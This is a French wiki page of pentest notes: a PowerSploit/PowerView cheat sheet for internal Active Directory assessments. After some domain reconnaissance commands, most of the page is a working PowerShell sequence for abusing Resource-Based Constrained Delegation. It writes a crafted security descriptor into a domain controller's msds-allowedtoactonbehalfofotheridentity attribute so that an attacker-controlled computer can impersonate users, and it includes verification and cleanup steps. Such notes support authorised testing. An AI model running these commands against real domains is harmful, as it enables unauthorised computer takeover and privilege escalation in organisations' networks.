---
title: PowerSploit
permalink: /PowerSploit/
---

# PowerSploit

## Cheat-Sheet

Liste de commandes utiles en pentest interne.

```powershell
# Contrôles de sécurité rapides
Get-DomainComputer -Unconstrained -Domain client.fr -Server DC.client.fr
Get-DomainUser -Admincount -Domain client.fr -Server DC.client.fr
Get-DomainGroupMember "Admins du domaine" -Domain client.fr -ServerDC.client.fr
```

Exploitation de la "Resource-Based Constrained Delegation". Nécessite de lancer les commandes avec un compte qui a GenericWrite sur l'ordinateur TARGET et d'avoir un compte avec un SPN (ATTACKER) ([Source](https://raw.githubusercontent.com/rewardone/OSCPRepo/479ea7e285d9997fdb243956ceef2c70474f350b/KeepNotes/BookmarkList/passwords%20and%20hashes/kerberos/kerberos%20delegation/resource-based%20constrained%20delegation/combination/maq%20dacl%20and%20allowedtoactonbehalfof/taking%20over%20computer/commands%20used/page.html))

```powershell
# On récupère le SID de l’ordinateur qu’on a jouté
$ComputerSid = Get-DomainComputer COMPUTER -DomainController SERVEURDC.client.fr -Domain client.fr -Properties objectsid | Select -Expand objectsid;
# On crée un « Security Descriptor » avec le compte correspondant
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))";
$SDBytes = New-Object byte[] ($SD.BinaryLength);
$SD.GetBinaryForm($SDBytes, 0);
# On modifie le champ 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer SERVEURDC -DomainController SERVEURDC.client.fr -Domain client.fr | Set-DomainObject -DomainController SERVEURDC.client.fr -Domain client.fr -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes};

# Les commande suivantes permettent de vérifier que la modif a bien été effectuée
$RawBytes = Get-DomainComputer SERVEURDC -DomainController SERVEURDC.client.fr -Domain client.fr -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity;
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

# Cleanup
Get-DomainComputer SERVEURDC -DomainController SERVEURDC.client.fr -Domain client.fr | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'  -DomainController SERVEURDC.client.fr -Domain client.fr
```

## Ressources
-   [PowerSploit sur Github](https://github.com/PowerShellMafia/PowerSploit/)
